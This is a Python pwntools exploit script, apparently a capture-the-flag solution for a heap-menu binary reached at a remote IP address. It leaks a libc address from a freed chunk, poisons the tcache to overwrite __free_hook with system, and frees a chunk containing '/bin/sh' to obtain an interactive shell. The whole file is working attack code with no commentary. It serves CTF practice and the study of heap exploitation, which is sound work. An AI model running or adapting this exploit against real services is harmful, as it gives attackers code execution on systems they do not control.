from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
#p=process("./www")
# p=gdb.debug("./www", gdbscript=gs)
p = remote('207.154.239.148', 1344)
#gdb.attach(p)

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def decrypt(cipher):
    key = 0
    for x in range(1,6):
        bits = 64 - 12 * x
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


malloc(0,1049,"chunk1")
malloc(1,24,"chunk2")
malloc(2,24,"chunk3")
malloc(3,24,"/bin/sh")
free(0)

resp = view(0)
leak_ = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
leak_padded = leak_.ljust(8, b'\x00')
leak = u64(leak_padded)
# print(hex(leak))

system_offset = 0x00052290
free_hook = 0x001eee48
leak_offset = 0x1ecbe0 
glibc = leak - leak_offset
# print(hex(glibc))

system = glibc + system_offset
# print(hex(system))
free(1)
free(2) 
target = glibc + free_hook
edit(2, p64(target))
malloc(10, 24, b"any thing")
malloc(11, 24, p64(system))
free(3)
p.interactive()